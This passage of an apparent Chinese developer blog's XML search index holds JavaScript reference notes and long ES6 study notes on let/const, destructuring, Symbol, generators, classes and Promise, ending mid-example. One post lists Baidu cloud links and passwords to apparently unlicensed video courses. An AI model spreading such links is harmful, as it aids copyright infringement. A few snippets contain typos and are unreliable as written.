从字符串的末尾开始检索字符串,返回结果同上match()/search() =&gt; 可以写正则表达式匹配检索replace() =&gt; 可以写正则表达式匹配替换substr() =&gt; 从起始索引号提取字符串中指定数目的字符substring() =&gt; 提取字符串中两个指定的索引号之间的字符toLowerCase() =&gt; 把字符串转换为小写toUpperCase() =&gt; 把字符串转换为大写更多属性方法的使用, 参照 JavaScript String 对象Math常用属性和方法PI =&gt; 圆周率ceil() =&gt; 向上取整, Math.ceil(1.34) =&gt; 2floor() =&gt; 向下取整, Math.flor(1.34) =&gt; 1max() =&gt; 返回最大值min() =&gt; 返回最小值// 返回数组中的最大值和最小值 var arr = [1, 2, 3, 5]; alert(Math.max.apply(null, arr));//最大值 alert(Math.min.apply(null, arr));//最小值 更多属性方法的使用, 参照 JavaScript Math 对象Date日期的定义var now = new Date()var now = new Date(2016, 4, 1) =&gt; 2016 年 5 月 1 日常用属性和方法getDate() =&gt; 返回一个月中的某一天 (1~31)getDay() =&gt; 返回一周中的某一天 (0~6)getMonth() =&gt; 返回月份 (0~11)getFullYear() =&gt; 完整的年份getYear() =&gt; 非完整年份(只有后两位)getTime() =&gt; 返回时间戳(毫秒,1970 年 1 月 1 日至今的毫秒数)toString() =&gt; 转化成字符串toLocaleString() =&gt; 根据本地格式转换更多属性方法的使用, 参照 JavaScript Date 对象try-catchtry { document.getElementById(&quot;now&quot;).innerHTML = &quot;hello&quot;; } catch (e) { console.log(&quot;未找到对应元素&quot;, e); } 分支语句语法if-elseif () { // } else if () { // } else { // } whilewhile () { // } do-whiledo { // } while() forfor (;;) { // } switch-caseswitch () { case &#39;&#39;: // break; case &#39;&#39;: case &#39;&#39;: // break; default: // } for-infor ( in ) { // }]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>CSS</tag>
        <tag>HTML5</tag>
        <tag>jQuery</tag>
        <tag>WEB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【发福利】视频教程]]></title>
    <url>%2Farchives%2Fb89e54c8.html</url>
    <content type="text"><![CDATA[最近得一套视频教程,里面包含 Node.js、Angular.js、WEB 开发、MySQL 等视频教程,全是百度云链接,尽快保存以防被和谐Angular链接：https://pan.baidu.com/s/1jId3Ov8 密码：v24xMySQL链接：https://pan.baidu.com/s/1c1SkGTy 密码：cqfmNode.js链接：https://pan.baidu.com/s/1pLMERwv 密码：bczq 链接：https://pan.baidu.com/s/1dFvUZKH 密码： pv9kPHP(包含 ThinkPHP 和 Laravel)链接：https://pan.baidu.com/s/1qYlzeES 密码：94sh 链接：https://pan.baidu.com/s/1o7UANKA 密码：nnsl 链接：https://pan.baidu.com/s/1dFwDy5z 密码：8yuuPython链接：https://pan.baidu.com/s/1dE20p5v 密码：guxnReact.js链接：https://pan.baidu.com/s/1sk93oXv 密码：26xnVue.js链接：https://pan.baidu.com/s/1sl9d6CP 密码：255c安全(开发中需要注意的安全)链接：https://pan.baidu.com/s/1migh5Tu 密码：xdq8大数据链接：https://pan.baidu.com/s/1dFCPP8d 密码：74m7服务器(Nginx)链接：https://pan.baidu.com/s/1o8OIKZK 密码：1a3v前端链接：https://pan.baidu.com/s/1jIR8IUy 密码：81g4算法链接：https://pan.baidu.com/s/1kVeNBE3 密码：923c微信小程序链接：https://pan.baidu.com/s/1c2rTl8s 密码：v9mqAndroidhttp://pan.baidu.com/s/1kUGIVUfES6链接：https://pan.baidu.com/s/1c1FwfYS 密码：ygogMongoDB链接：https://pan.baidu.com/s/1kVgSlCF 密码：vvnn]]></content>
      <categories>
        <category>design</category>
      </categories>
      <tags>
        <tag>Security</tag>
        <tag>Liunx</tag>
        <tag>HTML5</tag>
        <tag>Node.js</tag>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ES6 学习笔记]]></title>
    <url>%2Farchives%2Fb0e3118c.html</url>
    <content type="text"><![CDATA[本篇学习笔记纯粹记录学习 ES6 的过程以及一些坑点,下面的例子没有先后之分,也是很简单的例子,想了解更多的直接戳 ECMAScript 6 入门建立一个 ES6 专属项目创建 package.json,将以下的 json 复制到你的文件中,然后运行 npm insatll{ &quot;name&quot;: &quot;es6-demo&quot;, &quot;version&quot;: &quot;1.0.0&quot;, &quot;description&quot;: &quot;学习 ES6&quot;, &quot;main&quot;: &quot;src/index.js&quot;, &quot;devDependencies&quot;: { &quot;babel-cli&quot;: &quot;^6.26.0&quot;, &quot;babel-eslint&quot;: &quot;^8.0.2&quot;, &quot;babel-preset-latest&quot;: &quot;^6.24.1&quot;, &quot;babel-preset-react&quot;: &quot;^6.24.1&quot;, &quot;babel-preset-stage-2&quot;: &quot;^6.24.1&quot;, &quot;eslint&quot;: &quot;^4.10.0&quot;, &quot;eslint-friendly-formatter&quot;: &quot;^3.0.0&quot;, &quot;eslint-loader&quot;: &quot;^1.9.0&quot;, &quot;eslint-plugin-promise&quot;: &quot;^3.6.0&quot;, &quot;eslint-plugin-standard&quot;: &quot;^3.0.1&quot;, &quot;eslint-config-standard&quot;: &quot;^10.2.1&quot;, &quot;eslint-plugin-html&quot;: &quot;^3.2.2&quot;, &quot;nodemon&quot;: &quot;^1.12.1&quot;, &quot;eslint-plugin-import&quot;: &quot;^2.8.0&quot;, &quot;eslint-plugin-node&quot;: &quot;^5.2.1&quot; }, &quot;scripts&quot;: { &quot;test&quot;: &quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;, &quot;dev&quot;: &quot;nodemon ./src/index.js --exec babel-node&quot;, &quot;babel&quot;: &quot;babel-node ./src/index.js&quot;, &quot;lint&quot;: &quot;eslint --ext .js src&quot; }, &quot;author&quot;: &quot;&quot;, &quot;license&quot;: &quot;ISC&quot; } 可以看到上面的 package.json 是有 eslint 代码校验的,所以还需在项目目录下新建 .babelrc、.editorconfig、.eslintrc.js.babelrc{ &quot;presets&quot;: [&quot;es2015&quot;], &quot;plugins&quot;: [] } .editorconfigroot = true [*] charset = utf-8 indent_style = space indent_size = 2 end_of_line = lf insert_final_newline = true trim_trailing_whitespace = true .eslintrc.js// http://eslint.org/docs/user-guide/configuring module.exports = { root: true, parser: &quot;babel-eslint&quot;, parserOptions: { sourceType: &quot;module&quot; }, env: { browser: true }, // https://github.com/standard/standard/blob/master/docs/RULES-en.md extends: &quot;standard&quot;, // required to lint *.vue files plugins: [&quot;html&quot;], // add your custom rules here rules: { // allow paren-less arrow functions &quot;arrow-parens&quot;: 0, // allow async-await &quot;generator-star-spacing&quot;: 0, // allow debugger during development &quot;no-debugger&quot;: process.env.NODE_ENV === &quot;production&quot; ? 2 : 0 } }; 运行你的项目npm run dev 因为安装了 nodemon 该模块,所以我们不需要每次保存都去运行 node src/index.js, nodemon 该模块会在保存后自动执行命令ES6 块级作用域这一小节让我想到很多年前阅读到 Nicholas 的那本红宝书,所讲的作用域以及 Var。也许至今,还有一些人搞不明白变量提升的含义。如果你有幸在大学里写过 C 语言,其实这就很好理解了。一个我们所说明的变量其实包含声明,赋值两个部分,是否有看过在头文件里声明,或者在 C 函数体内先声明,比如：int sayB(){ int b; b = 1; return b; } sayB() 而 JS 中所提到的变量提升,与其非常类似,你在函数体内定义的变量,无论在哪里定义,都会提升到函数的顶部,比如：function b() { console.log(v);// ?会报错吗？ if (true) { var v = 1; } } // 其实不会,执行顺序会变成function b() { var v; console.log(v); if (true) { v = 1; } } 好了,我们不复习之前的知识了,块级作用域顾名思义的其作用域在一个小块中,其中跟两个关键字有关系 let 和 const ,于是乎你用它们定义的变量,也就只能存在于块级作用域内了。function b() { console.log(v); if (true) { let v = 1; } } 这个时候再打印 v 是会报错的,不像之前那样给你一个 undefined。通过这一小节的阅读,这应该是其中一个很大的知识点,以及知晓了一些有趣的事情,这和 let const 有关。let 和 const 定义的变量不会像 var 一样,覆盖到全局。以前我们用 var 来定义变量时,如果多写一个重名的,只会是最后一个覆盖之前的。但是,这里如果你用 let 或者 const 来定义时,必然会报错。而且 const 定义的变量是不允许再赋值的,但是它允许对于键的再赋值,比如：const b = { a: 1 }; // b.a = 2 (YES) 可以说对于以前我印象中最深刻的是如果从数组里可以正确的获取到其数值,需要借助闭包来完成,而现在因为块级作用域的存在,你完全可以不必要像 ES5 那样借助闭包了。for (let i = 0;i &lt; j;i++) { //i } 这个时候可以很顺利的完成从[0…n] 的过程。很明显,块级作用域在某些时候帮助我们节约了很多事情,不会像因为变量提升而带来的某些不可预知的奇怪问题。最后这一小节给出了最佳实践,同名而言,如果你定义的是一个预知的值（不再修改）那么你应该使用 const,反之你应该使用 let,尽量的避免使用 var,当然你想定义一个全局变量除外。字符串处理与函数说到字符串我想 ES6 提供了最好的便利是”模板语法”,这一特性让我们深受鼓舞,想着终于不是那么搓的来拼接变量了。当然,这一版本的 JS 在字符串上也提供了很多起他的方法,比起它来倒是要黯然神伤的多。比如我们几乎很少用到的 codePointAt,fromCodePoint,normalize,像这几个一般在国际化的产品中会有的比较多,一般正常情况下几乎很少会接触到。以前我们使用 indexOf &gt; -1 来判断一个字符是否在这个字符串中,现在好了 ES6 提供了三个方法它们都会返回一个布尔值来告诉你是否存在：includes,startsWith,endsWith。从字面上几乎可以理解第一个方法在字符串中检查指定的文本,有返回 true,没有返回 false。第二个和第三个方法只是在你检查的方向上有所区别,从首部开始还是从尾部开始而已。当然,如果你还是想要文本的位置,那么你可以继续使用 indexOf 或 lastIndexOf。哦,对了字符串还提供了一个 repeat 方法,用于返回一个将当前字符串重复几次之后的字符串,看起来,这玩意有些鸡肋,但是你要是开发编辑器之类的应用,它倒是非常有用。说说”模板语法”吧。const name = &quot;icepy&quot;; const message = `${name} call u`; console.log(message); 如果在以前我们想完成谁 call 你这样的动态消息,都需要如此：var name = &quot;icepy&quot;; var message = name + &quot;call u&quot;; console.log(message); 粗看起来也没有什么不好,但是如果这个消息会很长很长,那么就要用+来拼接几行了。那时候看起来,就比较搓了。如果有模板语法之后,我们会怎样？const name = &quot;icepy&quot;; const phone = &quot;186xxxxxx&quot;; const message = ` ${name} call u Phone Number: ${phone}`; 会不会舒服很多？当然这个特性带给你的不仅仅是这些,很重要的一点是完全可以支持”运算”式的表达式,你可以在完全可以支持”运算”式的表达式,你可以在{}来运算一些结果。看到这里,是不是感觉到和一些模板库很像？幸运的是,从今之后再也不用引入一些基础模板库了。在模板语法中我可能用的比较多的就是 tag,有时候我会比较偷懒,将字符串的转换写成函数,然后不同类型的转换,直接用 tag 就好,比如：function message(literals, ...subs) { // do } const name = &quot;icepy&quot;; const phone = &quot;186xxxxx&quot;; const mg = message`${name} call u, Phone Number: ${phone}`; 也许,从这个小例子里并不能看出来什么,你可以想象一下,如果你想自己控制结果的输出,在 message 函数中,你可以转换成任意的结果,完全取决于你写的这个 message 函数。比如在消息中,文本,会员,等级,之类的,你都可以偷懒在这个 message 函数中完成,结合某些判断来给出你想要的结果。ES6 的函数有几个显著的特点,方便了传入参数的处理,又不失优雅。提供的箭头函数虽然有诸多限制,但是在表达上减少了代码量还解决了我们在 ES5 中遇到的this丢失的问题。比较乐观的说,这是我非常喜欢使用的 ES6 新特性之一。在参数处理上,ES6 给大家提供了默认参数和不定参数的选择,而默认参数在某个形式上对于解决默认值的问题,终于不用再去处理很多的判断了,想想 JavaScript 在”布尔”逻辑判断上的隐式转换,比如”0” == false,如果你的参数传入的是 0,本意它就是一个真实存在的参数,当在逻辑判断中时,这个参数被隐式的转换了,从而获取了默认值。function logName(name = &quot;icepy&quot;) { console.log(name); } logName();// icepy logName(&quot;wower&quot;);// wower 在你细心的处理默认参数时,有一点需要注意：function logName(name = &quot;icepy&quot;, Qname = name) { // name // Qname } logName();//icepy 你可以将第二个参数的默认值设置成第一个参数,但是不能将第一个参数的默认值设置成第二个参数。关于不定参数我想和 Function 一起说说,先来看一段 Weex 执行业务 Code 的代码：/** * Call a new function body with some global objects. * @param {object} globalObjects * @param {string} code * @return {any} */ function callFunction(globalObjects, body) { const globalKeys = []; const globalValues = []; for (const key in globalObjects) { globalKeys.push(key); globalValues.push(globalObjects[key]); } globalKeys.push(body); const result = new Function(...globalKeys); return result(...globalValues); } 这个巧妙的 callFunction 就包含了我们想看到的不定参数与 Function 构造函数,不定参数使用…来表示,它用一个数组包含了其中的参数,相信读到这里,你会很快的联想到 ES5 中的 arguments,你可以说和它类似,又非常不同。如果在函数定义时写了不定参数,那么这个函数就只能接受唯一的一个,如果函数定义时定义了多个参数呢？function (name,...profile){ // profile [] // arguments // name } 你可以通过这样的关系看到不定参数与 arguments 之间的关系,arguments 永远包含所有的参数,这也意味着它包含了 name,而 profile 并不包含 name。回到上面的那段 Weex 核心代码,细心阅读一下,相信你会有收获。body 是 bundle.js 的业务代码,将它加入到 globalKeys 最后一个位置。定义一个拥有不定参数 globalKeys 的 Function 来生成一个函数Function 你可以知道,它接受参数和函数体,并且最后一个永远是函数体最后执行生成的函数,将 globalValues 当不定参数传入 说起来…还可以用来处理其他的事情,来多实践一下吧。说完参数,我们再来说说平时我们可能大量使用的 () =&gt; {} 箭头函数,它可能是我们非常乐见的”语法糖”之一,不过在此之前有一些要说明的是：自身没有 this,super 等,而这些需要外层的非箭头函数来决定不能实例化没有原型不能改变 this,arguments 等如果你写过 React + Redux,相信你一定对箭头函数使用的非常频繁,比如：const title = data =&gt; ({ type: TITLE, payload: { data } }); export const getDefaultData = () =&gt; dispatch =&gt; {}; 是不是有种似曾相识的感觉？有时候我们在写 React 组件时,可能会用到立即调用模式：... { render(){ return ( &lt;div&gt; (() =&gt; { return (&lt;div&gt;icepy&lt;/div&gt;) })() &lt;/div&gt; ); } } 不过,说真的,我常常配合着数组用,Why？表达的很简单：values.sort((a, b) =&gt; a - b); 解构和扩展对象的功能性如果你正在开发使用数据驱动的应用,那么这一小节的内容对你来讲,就非常重要了,欢迎来到解构的世界。何为”解构”？当我们定义了很多对象和数组,又必须从中提取有价值的数据时,这种行为在 ES6 中被称为”解构”,解构分为两种：对象解构和数组解构。如果你定义过这样的对象：const obj = { name: &quot;icepy&quot;, work: &quot;alibaba&quot; }; const { name, work } = obj; 这是一种非常常见的解构,将值提取出来,假设有一天 icepy 离职了,没有工作呢？const obj = { name: &quot;icepy&quot; }; const { name, work } = obj; 这个时候 work 会是一个 undefined,但是我想给予他一份”新的工作”,骑摩托车旅行：const obj = { name: &quot;icepy&quot; }; const { name, work = &quot;骑摩托车旅行&quot; } = obj; 当然,如果可以,我们也可以重新定义一个名字,比如 work 变成 travel：const obj = { name: &quot;icepy&quot; }; const { name, work: travel = &quot;骑摩托车旅行&quot; } = obj; 解构在函数的参数中也可以定义,当然传参时需要传入的是对象了。如果你写过一些 Redux,那么相信对这个会无比的熟悉：export const changeDate = ({ mode, date }) =&gt; dispatch =&gt; { dispatch(setTime({ mode, date })); }; // 在action里可以直接使用mode和date 如果你有多重嵌套的对象,解构也可以很方便的提取出来你想要的数据：const obj = { home: { ad: &quot;hunan 湘西&quot;, mz: &quot;m&quot; }, name: &quot;icepy&quot; }; const { home: { ad, mz = &quot;h&quot; }, name } = obj; 那么,如果你这样定义过数组：const arr = [1, 2, 3]; let [f, s, t] = arr; console.log(f);//1 console.log(s);//2 console.log(t);//3 当然如果你只想取第三个元素,只需要用,占位即可,如果你想从嵌套的数组中提取数据,其实和对象非常类似：const arr = [1, 2, 3]; let [, , t] = arr; const arr = [1, [2], 3]; let [, [f]] = arr; // f 曾经我们可能会有这样的一个需求,有一个数组,需要第五个元素之后的元素,返回一个新数组：const arr = [1, 2, 3, 4, 5, 6, 7, 8, 9]; let [, , , , , ...f] = arr; //f 而现在,这样多简单。当然在这一小节中,主要的内容都是这些实践操作性的内容,如果有时间,不妨试试。在《红宝书》里是这样来说对象初始值的：var name = &quot;icepy&quot;; var age = 18; var obj = { name: name, age: age, say: function() { console.log(this.name); } }; 到了 ES6 中,你可以使用一个更简写的方式：let name = &quot;icepy&quot;; let age = 18; let obj = { name, age, say() { console.log(this.name); } }; 比之 ES5,这拥有了极致的简化,而且使用 say(){}定义的属性可以调用 super。这一小节里讲的内容,比较重要的是讲原型的增强,其他的比如对对象的增强,仅是添加了几个我们已经比较常用的方法了：Object.is; Object.assign; Object.setPrototypeOf; 可能某些情况下会出现这样的状况,A 类是 B 类的父类,A 类定义了 say 方法,B 类也定义了 say 方法,在 B 类的 parentSay 中调用 A 类的 say 方法,实例化 B 类,直接调用 parentSay 方法,这个时候我们就很尴尬了,如果调用 this.say,不一定能调用到 A 类定义的 say 方法。在 ES5 中给我们提供了一个 getPrototypeOf 方法来获取任意一个对象的原型,根据 JS 的继承机制我们可以知道如果调用 Object.getPrototypeOf(this)正好就可以获取到父类的原型,然后再调用 say 方法就可以了。但,这也有一个很尴尬的问题,于是,ES6 给我们提供了 super 来代表父类,这个时候,我们直接使用 super.say()就很方便的区别调用 A 类的 say 方法和 B 类的 say 方法了。有趣的是,ES6 还为我们提供了一个设置原型的方法”setPrototypeOf”,这个方法可以设置原型对象。如果曾经你使用过类似 jQuery 的 extend 方法,那么就应该对 assign 会有相当熟悉了感觉,它和 extend 非常类型,可以将一对象中的属性,方法赋值给另一个对象。至于 is,就是一个正确的布尔值比对,大部分情况下与 === 行为一致。什么是 Symbol 以及怎么使用Symbol 其实解决了两个问题：唯一性通过 Symbol 的属性来操作 JavaScript 内部的逻辑这个特性的出现为我们定义程序有了普遍的意义,它和原来的六个原始类型一样,也是一个原始类型,你可以调用 Symbol()来初始化。let v = Symbol(&quot;icepy&quot;); 唯一性我们知道在 JavaScript 的世界里,唯一性是很难被描述的,哪怕你用任意的加密函数生成的 Key 也有可能被撞库,Symbol 为我们带来了这样的唯一性：let name = Symbol(&quot;name&quot;); let max = Symbol(); let obj = { [name]: &quot;icepy&quot;, [max]: 29 }; // Symbol() Symbol 可以接收一个参数,这个参数用来 des,主要用于程序调试时的跟踪,当然你也可以不传入参数,同样的我们可以通过 typeof 来判断是否为 Symbol 类型。Symbol 属性中提供了 for 方法来处理全局共享的问题,它可以从指定的 Symbol 注册表中来搜索到具体的内容,反之你可以用 keyFor 来推断某个 Symbol 关联的键。通过 Symbol 的属性来操作 JavaScript 内部的逻辑以前我们比较难去操作 JavaScript 本身语言内部的逻辑,最多也是在原型链上去定义或者修改某个方法的实现,Symbol 的属性中提供了很多去处理程序内部执行的逻辑,如果你有兴趣,可以仔细阅读一下 MDN 上的文档： Symbol ,这里主要举一个例子来说明：在以前我们想判断一个数组,可能会这样写：let f = []; Object.prototype.toString.call(f); // &quot;[object Array]&quot; 我们可以定义”[object Array]”来判断,但是,假设今天我们写的某些应用程序中,我想将某些类定义出来类型,通过类型的判断,想解决一些问题,最开始我们可能可以用 instance 来判断是哪个实例,但,这解决不了问题。有了 Symbol 属性之后,我们可以改变 Object.prototype.toString 的返回值。function Pre() {} Pro.prototype[Symbol.toStringTag] = &quot;Pre&quot;; const me = new Pre(); // Object.prototype.toString.call(me) // [object Pre] 可能在这个粗躁的例子中,很难看出来 Symbol 的作用。但是,在之前有说到可以通过 instance 来判断是否为某个类或函数的实例,有一天我想给予它就算它是真实的实例,我也想让它返回 false,即：不是一个实例。function Pre() {} Object.defineProperty(Pre, Symbol.hasInstance, { value: function() { return false; } }); 这就是 Symbol 的作用之一,来改变语言程序内部的逻辑。也许,这些特性在你真实的应用中,很少会用到,不过,看一看,也是没有坏处的。新的 Set 集合,Map 集合曾经在 JavaScript 中就只有一种集合可用：数组,如果可以你将对象也称之为一种集合。对于老程序员来说,数组可能会勾起很多大家的回忆,毕竟我们用数组,对象实现了诸如去重复,缓存等等,而今天,ES6 带来了 Set 集合和 Map 集合,让我们更方便的去操作这些。SetWeakSetMapWeakMap关于 API 有兴趣的朋友,可以去翻一翻文档,特别简单。 在使用 Set 或者 WeakSet 之前,你应该需要了解一下 Set 或 WeakSet 的特点：它是一个不可重复的无序列表 值与值之间的比较是通过 Object.is 方法来进行的,这也意味着 5 和”5”会占据两个空间 Set 和 WeakSet 区别在于,WeakSet 只提供了基础的方法,并且是一个弱引用。 如果你有兴趣对一个数组去除重复的值：[...new Set([1, 1, 1, 2, 2, 3, 3, 2, 5])]; 这就是 Set 集合给予的魅力。关于 Map 和 WeakMap,你应该也需要知晓其中的特点：它是一个由多个无序键值对组成的集合键名可以是任意的数据类型WeakMap 的键名只能是对象,与 WeakSet 类似,它也是一个弱引用Map 比 WeakMap 多了几个方法,但是基础的 set get 都是相同的目前,已知的 Map 的用途,可能就是来存储私有数据,存储对象引用（可以自动释放）,大部分情况下,你基本不会用到 Map。let privateData = new WeakMap(); class Pre { constructor(name) { privateData.set(this, { name }); } preName() { return privateData.get(this).name; } } export default Pre; 这些对于内存管理倒是很方便了,不需要自己手动的去跟踪信息,再手动的去设置 null 来断开引用。iterator 和 generator 的使用这一小节的内容,比较鼓舞的是终于可以在 JS 语言层面,能看见 Iterator 和 Generator 了。说到迭代器,也许你会有疑问,可以预期的,你能看到 Generator 的实现也是依赖迭代器。我所接触到的编程语言中,最早让我理解这个特性的是 Python。迭代器是一种特殊的对象,它的设计有专门的接口（描述）来完成我们常说的迭代（循环）过程。每一个迭代器对象,都具备 next 方法（当然它也具备一些比如 throw 方法）,当你执行 next 方法时,会返回一个（描述）对象,这个对象中,存在 value,done 属性,你想要的值就是 value,而 done 则是用来描述整个迭代过程是否结束,可以想象,当迭代过程结束之后,value 的值必然会是一个”空”（不同语言的描述不同）,JS 会给你一个 undefined。目前我们所知道的数组,Set,Map 这三个集合是会存在迭代器,而且它们都有内建的迭代器：entries,values,keys。不知道,你在前几个小节中是否有印象 Symbol 中存在一个 iterator 属性,如果你想知道,不妨翻一翻之前分享的 Symbol。在这里,我们可以通过 Symbol.iterator 来获取默认的迭代器（如果具备 Symbol.iterator 属性,那么意味着它必然具备默认的迭代器）。let sets = [1, 2, 3]; let iterator = sets[Symbol.iterator](); console.log(iterator.next()); console.log(iterator.next()); console.log(iterator.next()); 如果你不想调用三下迭代器,你可以自己写一个小的循环,比如：let res = iterator.next(); while (!res.done) { res = iterator.next(); console.log(res); } 所谓的 Generator 也就是一种可以返回迭代器的函数,只不过它用*和 yield 来表示（描述过程）。function* createIterator() { yield 1; yield 2; } let iterator = createIterator(); console.log(iterator.next()); console.log(iterator.next()); 其实这很好理解,（语言）在背后帮我们对这个函数进行了包装,每一个 yield 都会返回一个迭代器对象,你想执行真正的逻辑,或者你想获取值,都需要通过这个迭代器对象来获取。Generator 可以辅助我们完成很多复杂的任务,而这些基础知识,又与 iterator 息息相关,举一个很简单的例子,相信有很多朋友,应该使用过 co 这个异步编程的库,它就是用 Generator 来实现,当然它的设计会比例子要复杂的多,我们先来看一个 co 简单的用法：import co from &quot;co&quot;; co(function*() { var result = yield Promise.resolve(true); return result; }).then( function(value) { console.log(value); }, function(err) { console.error(err.stack); } ); 相应的,我们来实现一个简化的版本：function co(task){ let _task = task() let resl = _task.next(); while(!resl.done){ console.log(resl); resl = _task.next(resl.value); } } function sayName(){ return { name: &#39;icepy&#39; } } function assign *(f){ console.log(f) let g = yield sayName() return Object.assign(g,{age:f}); } co(function *(){ let info = yield *assign(18) console.log(info) }) 虽然,这个例子中,还不能很好的看出来”异步”的场景,但是它很好的描述了 Generator 的使用方式。从最开始的定义中,已经和大家说明了,Generator 最终返回的依然是一个迭代器对象,有了这个迭代器对象,当你在处理某些场景时,你可以通过 yield 来控制,流程的走向。通过 co 函数,我们可以看出,先来执行 next 方法,然后通过一个 while 循环,来判断 done 是否为 true,如果为 true 则代表整个迭代过程的结束,于是,这里就可以退出循环了。在 Generator 中的返回值,可以通过给 next 方法传递参数的方式来实现,也就是遇上第一个 yield 的返回值。有逻辑,自然会存在错误,在 Generator 捕获错误的时机与执行 throw 方法的顺序有关系,一个小例子：let hu = function*() { let g = yield 1; try { let j = yield 2; } catch (e) { console.log(e); } return 34; }; let _it = hu(); console.log(_it.next()); console.log(_it.next()); console.log(_it.throw(new Error(&quot;hu error&quot;))); 当我能捕获到错误的时机是允许完第二次的 yield,这个时候就可以 try 了。Iterator 和 generator 给了我们很多启发,在编程的维度上,我能想到的就是去处理异步代码时为我们提供便捷的方式。当然迭代器,这个方向上,可以做的事情有很多,如果你悉心去寻找,相信,很快能找到答案。怎么写类,以及 Promise 和如何封装处理异步大部分面向对象的语言都支持类和类继承的特性 从 ECMA1-ECMA5 的版本都不支持类和类继承的特性,于是开发者们通过原型,构造函数等来模拟类和类继承特性,这里不在复述,如果你有兴趣的话,可以阅读一下红包书（JavaScript 高级程序设计）中关于类,类继承这两章。ECMA6 终于至少在语言层（依然是基于原型的语法糖）面看起来支持了类和类继承,理解类的基本原理有助于理解 ES6 关于类的设计。基本的类声明class Human { constructor(name) { this.name = name; } sayName() { console.log(this.name); } } let man = new Human(&quot;icepy&quot;); man.sayName(); console.log(typeof Human);// function 类的基本定义与一个构造函数非常的类似,通过 typeof 也能看得出来 class 定义的也是一个 function,在声明中,我们定义的属性,定义了原型上的方法 sayName。但是,类声明的比之函数声明,又多了一些不同的东西,比如类声明是不允许提升的,且内部运行的环境 100%的严格模式不允许强制降级。类与函数一样,也可以是表达式,也可以将类当一个参数传给另外的函数或者类：let Human = class { constructor(name) { this.name = name; } sayName() { console.log(this.name); } }; function fetchObj(HumanClass) { return new HumanClass(&quot;icepy&quot;); } let man = fetchObj(Human); 但是匿名的类表达式,有一个不好的地方,就是在调试的时候很难定位,不过我们可以像函数一样给表达式加上一个 name：let Human = class Human{ ... } 高阶知识我们可以为类中的属性创建访问器,就像使用 Object.defineProperty 给对象的属性创建访问器一样的含义。class Human { constructor(name) { this.name = name; } get name() { return this.manName; } set name(newValue) { this.manName = newValue; } } 唯一需要注意的是关于”死循环”的问题。类中的方法,访问器,都可以和对象一样,可计算,也就是使用[]这些方法,属性的名字可以用变量来代替。有趣的知识点,是可以在类中声明一个 generator 方法,这一点倒是可以和上一小节的内容结合起来,不过一般情况下,在类中声明一个 generator 方法的情况非常少见：class Human { constructor(name) { this.name = name; } *sayName() { yield 1; } } 你如果有兴趣的话,可以把 sayName 改造成可支持异步的。关于”静态”也就是说不必实例化就可以调用的方法,类语法也支持了这个：class Human { constructor(name) { this.name = name; } static sayWork(name) { return new Human(name); } } Human.sayWork(); 有趣的是,如果是在同一个类中两个静态方法,其中一个方法想调用另外一个静态方法,这个时候,也可以使用 this。class Human { constructor(name) { this.name = name; } static sayWork(name) { return new Human(this.whichName()); } static whichName() { return &quot;icepy&quot;; } } 既然说到了类,我们不可避免的要谈到继承,在 ES6 中的类继承几乎简化到了一个关键字 extends,而且从前面的可计算来说,继承这个地方也是可以被计算的。class Human { constructor(name) { this.name = name; } } class Icepy extends Human { constructor(name) { super(name); } sayName() { console.log(this.name); } } 关于 super 使用的时机,在前几章中有谈到,类中如果有继承,并且指定了 constructor,那么就必须在使用 this 之前先调用 super 来初始化 this。这个继承不仅仅是原型上,也包括静态成员,而且就算父类与子类都有同样的方法名,也不怕被覆盖,可以用http://this.xxx和http://super.xxx来分别调用,在以往我们用原型模拟时,就非常难界定这个方法到底调用来自哪里。如果你想知道类是否被实例化,也可以通过 new.target 来确定,在别的语言中有抽象类的概念,也就是只定义描述不搞实现,并且不能被实例化,只能被继承。这个时候,new.target 就能排上用场了。class Human { constructor() { if (new.target === Human) { throw new Error(&quot;抽象类不可以使用new&quot;); } } sayName() {} } 最后一个想说一下的是关于 Symbol.species 属性,这个属性用来返回函数的静态访问器属,说得更直白一些,你想用 instanceof 来判断一个对象属于哪个类,用它就能改变这个逻辑的内部实现,从而判定出可能不是原来访问器的类名。class MyArrar extends Array { static get [Symbol.species]() { return Array; } } 正常情况下 MyArray 返回的必然是 MyArray,如果我想让它返回 Array,那么这个时候就需要用到 Symbol.species 属性了。类属于 ES6 的新特性,它让我们可以更方便,安全的定义类,使用类,而不是像 ES5 一样,需要搞那么多复杂的东西来模拟这个特性。在异步编程概念已经普及的今天,我们依然要谈一谈它,对于我们做前端代码的意义。当你通过 Ajax 请求数据使用回调函数来获取数据时,这就是一种异步编程。$.ajax({ url: &quot;xxx&quot;, success: function(data) { // data } }); 考虑到 JavaScript 属于单线程的特点,异步对于这门语言就可见多么的重要。你可以试着想想,当我们没有异步时,我正准备提交一个信息,界面就卡住了,一直要等待信息返回结果才能有接下来的其他操作,这很痛苦。在 JavaScript 的世界里,异步是非常重要的一件事情。Promise 正是想来处理这样的异步编程,如果我们用 Promise 该如何处理这段 Ajax？function fetch() { return new Promise(function(resolve, reject) { $.ajax({ url: &quot;xxx&quot;, success: function(data) { resolve(data); }, error: function(error) { reject(error); } }); }); } fetch() .then(function(data) {}) .catch(function(error) {}); 这辅助我们避免了回调地狱式的恐惧,更优雅的处理了回调。如果,你有兴趣,可以配合着 Promise 来学习【理论上的内容,可以仔细阅读】。Promise 声明周期进行中（pending）已经完成（fulfilled）拒绝（rejected）如同上面 Ajax 的例子,我们可以很好的包装一个函数,让 fetch 函数返回一个 Promise 对象。在 Promise 构造函数里,可以传入一个 callback,并且在这里完成主体逻辑的编写。唯一需要注意的是：Promise 对象只能通过 resolve 和 reject 函数来返回,在外部使用 then 或 catch 来获取。如果你直接抛出一个错误（throw new Error(‘error’)）,catch 也是可以正确的捕获到的。Promise 其他的方法Promise.all（当所有在可迭代参数中的 promises 已完成,或者第一个传递的 promise（指 reject）失败时,返回 promise。）var p1 = Promise.resolve(3); var p2 = 1337; var p3 = new Promise((resolve, reject) =&gt; { setTimeout(resolve, 100, &quot;foo&quot;); }); Promise.all([p1, p2, p3]).then(values =&gt; { console.log(values);// [3, 1337, &quot;foo&quot;] }); Promise.race（返回一个新的 promise,参数 iterable 中只要有一个 promise 对象”完成（resolve）”或”失败（reject）”,新的 promise 就会立刻”完成（resolve）”或者”失败（reject）”,并获得之前那个 promise 对象的返回值或者错误原因。）var p1 = new Promise(function(resolve, reject) { 